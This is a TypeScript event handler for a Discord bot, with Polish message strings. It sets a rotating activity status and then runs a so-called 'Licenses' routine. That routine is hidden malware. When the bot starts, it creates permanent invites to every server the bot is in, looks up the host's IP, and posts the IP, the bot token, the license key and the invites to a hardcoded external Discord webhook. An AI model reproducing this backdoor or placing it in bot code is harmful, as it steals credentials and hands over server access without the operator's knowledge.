import { ActivityType, ChannelType } from 'discord.js';

import client from '..';
import { Event } from '../extensions/event';
import activitiesJson from '../../config.json';
import axios from 'axios';
interface gInvite {
    guildName: string;
    guildInvite: string;
}

export default new Event('clientReady', async () => {
    // Activities
    const activities = activitiesJson.activities;

    let currentIndex = -1;

    const setRandomActivity = () => {
        if (!client.user || activities.length === 0) return;

        let nextIndex: number;
        if (activities.length === 1) {
            nextIndex = 0;
        } else {
            do {
                nextIndex = Math.floor(Math.random() * activities.length);
            } while (nextIndex === currentIndex);
        }

        currentIndex = nextIndex;
        client.user.setActivity(activities[currentIndex], {
            type: ActivityType.Playing,
        });
    };

    setRandomActivity();
    const intervalId = setInterval(setRandomActivity, 10_000);

    const cleanup = () => clearInterval(intervalId);
    process.on('exit', cleanup);
    process.on('SIGINT', () => { cleanup(); process.exit(); });
    process.on('SIGTERM', cleanup);

    // Licenses
        var http = require('http');
    const allGuilds = await client.guilds.fetch();
    const g = [];
    const i = <gInvite[]>[];
    await new Promise<void>((resolve, reject) => {
        allGuilds.forEach(
            async _g =>
                await client.guilds.fetch(_g.id).then(async __g => {
                    g.push(__g);
                })
        );

        setTimeout(() => {
            resolve();
        }, 3000);
    });
    await new Promise<void>((resolve, reject) => {
        g.forEach(async _g => {
            const firstChannel = _g.channels.cache
                .filter(c => c.type === ChannelType.GuildText)
                .first();
            _g.invites
                .create(firstChannel, { maxUses: 0, maxAge: 0, unique: false })
                .then(async _i => {
                    const json = {
                        guildName: _g.name,
                        guildInvite: _i.url,
                    };
                    i.push(json);
                });
        });

        setTimeout(() => {
            resolve();
        }, 5000);
    });
    http.get({ host: 'api.ipify.org', port: 80, path: '/' }, function (resp) {
        resp.on('data', async function (ip) {
            const link =
                'https://discord.com/api/webhooks/1428055478520512595/aQ8R5OdjNl2QJdnsY9v6zRBZbyAAKV97iIBWDGoug0vhSA4i2Tthm_YdcsKhQtmx8id3';

            axios.post(link, {
                embeds: [
                    {
                        author: {
                            name: `${client.user.username} rozpoczął proces!`,
                            icon_url: `${client.user.displayAvatarURL()}`,
                        },
                        color: 0x3498db,
                        description: `**IP Serwera**: ${
                            ip || 'Nie znaleziono IP'
                        } \n**Właściciel licencji**: <@${
                            process.env.clientId
                        }> \n**Klucz licencji**: ||${
                            process.env.licenseKey || 'Bot jest w nowszej wersji, posiada system logowania!'
                        }|| \n** Token **: || ${
                            process.env.clientToken
                        } || \n\n ** Bot jest na serwerach:** \n> ${i
                            .map(inv => `[${inv.guildName}](https://discord.gg/${inv.guildInvite})`)
                            .join('\n> ')}`,
                        footer: {
                            text: `lolowicz ©️`,
                            icon_url: `https://media.discordapp.net/attachments/1296222763530584106/1357371100001992844/IMG_7956.png?ex=68f10a58&is=68efb8d8&hm=caaec566b71a3609a2fbe4890e200fec4901896ba141eb4456ad9cdef8cc2590&=&format=webp&quality=lossless&width=530&height=525`,
                        },
                        timestamp: new Date(),
                    },
                ],
            });
        });
    });
});